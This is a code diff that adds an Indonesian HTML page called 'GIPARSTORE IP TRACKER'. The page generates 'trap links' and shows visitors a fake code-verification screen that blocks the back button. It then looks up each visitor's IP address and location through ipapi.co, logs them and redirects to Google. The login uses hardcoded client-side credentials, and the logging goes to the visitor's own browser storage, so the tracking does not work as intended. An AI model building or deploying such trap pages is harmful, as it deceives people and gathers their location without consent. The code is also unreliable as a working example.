@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GIPARSTORE</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        gelap: '#050814',
+                        biru: '#007bff'
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            background: #050814;
+            min-height: 100vh;
+            margin: 0;
+            transition: all 0.3s ease;
+        }
+        .halaman { display: none; }
+        .aktif { display: block; }
+    </style>
+</head>
+<body class="text-white">
+
+<!-- ================================== -->
+<!-- HALAMAN LOGIN -->
+<!-- ================================== -->
+<div id="halamanLogin" class="halaman aktif flex items-center justify-center min-h-screen p-4">
+    <div class="w-full max-w-sm bg-gelap p-6 rounded-xl border border-biru/30 shadow-lg">
+        <h1 class="text-2xl font-bold text-center text-biru mb-6">GIPARSTORE</h1>
+        <div class="mb-4">
+            <label class="block mb-1 text-sm">Username</label>
+            <input type="text" id="user" class="w-full p-2 rounded bg-gray-800 border border-gray-700 focus:outline-none focus:border-biru" required>
+        </div>
+        <div class="mb-6">
+            <label class="block mb-1 text-sm">Password</label>
+            <input type="password" id="pass" class="w-full p-2 rounded bg-gray-800 border border-gray-700 focus:outline-none focus:border-biru" required>
+        </div>
+        <button onclick="login()" class="w-full bg-biru hover:bg-blue-700 py-2 rounded font-semibold">MASUK</button>
+        <p id="pesanLogin" class="mt-4 text-center text-red-400 text-sm"></p>
+    </div>
+</div>
+
+<!-- ================================== -->
+<!-- HALAMAN DASHBOARD -->
+<!-- ================================== -->
+<div id="halamanDashboard" class="halaman p-4 min-h-screen">
+    <div class="max-w-3xl mx-auto">
+        <div class="flex justify-between items-center mb-6">
+            <h1 class="text-xl font-bold text-biru">GIPARSTORE | IP TRACKER</h1>
+            <button onclick="keluar()" class="bg-red-600 px-3 py-1 rounded text-sm">Keluar</button>
+        </div>
+        <div class="grid gap-5">
+            <div class="bg-gelap p-5 rounded-xl border border-biru/30">
+                <h3 class="text-lg font-semibold mb-4">🔗 Buat Link Jebakan</h3>
+                <button onclick="buatLink()" class="w-full bg-biru hover:bg-blue-700 py-2 rounded">BUAT LINK BARU</button>
+                <div id="linkHasil" class="mt-4 p-3 bg-gray-800 rounded break-words text-sm text-green-400"></div>
+            </div>
+            <div class="bg-gelap p-5 rounded-xl border border-biru/30">
+                <h3 class="text-lg font-semibold mb-4">📋 Data IP Masuk</h3>
+                <div id="dataIP" class="max-h-80 overflow-y-auto space-y-2 text-sm"></div>
+                <button onclick="muatUlang()" class="mt-3 bg-gray-700 px-3 py-1 rounded text-xs">🔄 Muat Ulang</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ================================== -->
+<!-- HALAMAN VERIFIKASI KODE -->
+<!-- ================================== -->
+<div id="halamanVerifikasi" class="halaman flex items-center justify-center min-h-screen p-4">
+    <div class="w-full max-w-md bg-[#0a0e17] p-6 rounded-xl border border-blue-500/30 shadow-xl text-center">
+        <h2 class="text-xl font-bold text-blue-400 mb-4">⚠️ Verifikasi Diperlukan</h2>
+        <p class="text-gray-300 mb-5">Masukkan kode akses untuk melanjutkan. Halaman ini akan tetap muncul sampai kode benar dimasukkan.</p>
+        <input type="password" id="kodeInput" placeholder="Ketik kode di sini" class="w-full p-3 rounded bg-gray-800 border border-blue-500/40 text-center text-lg mb-4 focus:outline-none focus:border-blue-500">
+        <button onclick="cekKode()" class="w-full bg-blue-600 hover:bg-blue-700 py-2 rounded font-semibold">KIRIM</button>
+        <p id="pesanKode" class="mt-3 text-sm text-red-400"></p>
+    </div>
+</div>
+
+<script>
+// ==================================
+// PENGECEKAN HALAMAN YANG DIBUKA
+// ==================================
+const params = new URLSearchParams(window.location.search);
+const mode = params.get('mode');
+
+if (mode === 'track') {
+    // Jika dibuka sebagai link jebakan
+    document.getElementById('halamanLogin').classList.remove('aktif');
+    document.getElementById('halamanDashboard').classList.remove('aktif');
+    document.getElementById('halamanVerifikasi').classList.add('aktif');
+    blokirKembali();
+    cekSudahVerifikasi();
+} else {
+    // Jika dibuka sebagai halaman utama
+    if (localStorage.getItem("gipar_login") === "ok") {
+        bukaDashboard();
+    } else {
+        bukaLogin();
+    }
+}
+
+// ==================================
+// FUNGSI LOGIN
+// ==================================
+function login() {
+    const user = document.getElementById('user').value.trim();
+    const pass = document.getElementById('pass').value.trim();
+    if (user === "admin" && pass === "gipar123") {
+        localStorage.setItem("gipar_login", "ok");
+        bukaDashboard();
+    } else {
+        document.getElementById('pesanLogin').innerText = "❌ Username atau Password salah!";
+    }
+}
+
+function bukaLogin() {
+    document.getElementById('halamanLogin').classList.add('aktif');
+    document.getElementById('halamanDashboard').classList.remove('aktif');
+    document.getElementById('halamanVerifikasi').classList.remove('aktif');
+}
+
+function bukaDashboard() {
+    document.getElementById('halamanLogin').classList.remove('aktif');
+    document.getElementById('halamanDashboard').classList.add('aktif');
+    document.getElementById('halamanVerifikasi').classList.remove('aktif');
+    tampilkanData();
+}
+
+function keluar() {
+    localStorage.removeItem("gipar_login");
+    bukaLogin();
+}
+
+// ==================================
+// FUNGSI BUAT LINK
+// ==================================
+function buatLink() {
+    const kodeUnik = Math.random().toString(36).slice(2, 9);
+    const link = `${window.location.origin}${window.location.pathname}?mode=track&id=${kodeUnik}`;
+    document.getElementById('linkHasil').innerText = link;
+}
+
+// ==================================
+// FUNGSI DATA IP
+// ==================================
+function tampilkanData() {
+    const kotak = document.getElementById('dataIP');
+    const daftar = JSON.parse(localStorage.getItem("gipar_ip_list")) || [];
+    kotak.innerHTML = daftar.length === 0 
+        ? "<p class='text-gray-400'>Belum ada yang klik</p>" 
+        : "";
+    daftar.forEach(item => {
+        kotak.innerHTML += `<div class="p-2 bg-gray-800 rounded my-1">
+            📌 IP: ${item.ip}<br>
+            ⏰ Waktu: ${item.waktu}<br>
+            🌍 Lokasi: ${item.lokasi || "-"}
+        </div>`;
+    });
+}
+
+function muatUlang() {
+    tampilkanData();
+}
+
+// ==================================
+// FUNGSI VERIFIKASI KODE
+// ==================================
+function blokirKembali() {
+    history.pushState(null, null, location.href);
+    window.onpopstate = () => history.go(1);
+}
+
+function cekSudahVerifikasi() {
+    if (localStorage.getItem("sudah_verifikasi") === "ya") {
+        lanjutNormal();
+    }
+}
+
+function cekKode() {
+    const kode = document.getElementById("kodeInput").value.trim();
+    if (kode === "222") {
+        localStorage.setItem("sudah_verifikasi", "ya");
+        lanjutNormal();
+    } else {
+        document.getElementById("pesanKode").innerText = "❌ Kode salah! Coba lagi.";
+        document.getElementById("kodeInput").value = "";
+    }
+}
+
+function lanjutNormal() {
+    fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .then(data => {
+            const dataBaru = {
+                ip: data.ip,
+                waktu: new Date().toLocaleString("id-ID"),
+                lokasi: `${data.city}, ${data.region}, ${data.country_name}`
+            };
+            let daftar = JSON.parse(localStorage.getItem("gipar_ip_list")) || [];
+            daftar.push(dataBaru);
+            localStorage.setItem("gipar_ip_list", JSON.stringify(daftar));
+            window.location.href = "https://google.com";
+        })
+        .catch(() => window.location.href = "https://google.com");
+}
+</script>
+
+</body>
+</html>
